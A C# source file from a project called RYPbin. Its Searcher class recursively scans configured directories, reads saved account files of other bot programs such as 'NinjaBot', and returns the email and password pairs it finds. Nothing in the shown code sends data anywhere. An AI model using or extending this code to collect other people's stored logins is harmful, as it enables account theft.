/*
The MIT License (MIT)

Copyright (c) 2016 SirJosh3917

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 */

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Xml;
using System.Xml.Serialization;

namespace RYPbin
{
    public class Searcher
    {
		private Directories DirList;

		public Searcher()
		{
			DirList = new Directories();
		}

		public List<Account> Search()
		{
			List<Account> Accounts = new List<Account>();

			bool DirNull = false;

			while (!DirNull)
			{
				string SearchIn = DirList.GetNextDirectory();

				if (SearchIn == "null")
				{
					DirNull = true;
				}
				else
				{
					SearchMethod s = SearchMethod.None;
					s = DirList.GetNextSearchMethod();

					if (s == SearchMethod.NinjaBot ||
						s == SearchMethod.NinjaBot2)
					{
						foreach (Account n in DirList.GetFromFile(s, ""))
						{
							Accounts.Add(n);
						}
					}
					else
					{
						foreach (string i in GetFiles(@SearchIn))
						{
							foreach (Account n in DirList.GetFromFile(s, i))
							{
								Accounts.Add(n);
							}
						}
					}
				}
			}

			foreach(Account i in Accounts.ToArray())
			{
				if(i.Email == "" || i.Password == "")
				{
					Accounts.Remove(i);
				}
			}

			return Accounts;
		}

		public static List<string> GetFiles(string DirectoryFind)
		{
			List<string> ret = new List<string>();
			if( Directory.Exists( DirectoryFind ) ) {
				foreach( string i in Directory.GetDirectories( @DirectoryFind ) ) {
					foreach( string n in GetFiles( i ) ) {
						ret.Add( n );
					}
				}

				foreach( string i in Directory.GetFiles( @DirectoryFind ) ) {
					ret.Add( i );
				}
			}

			return ret;
		}
    }
}
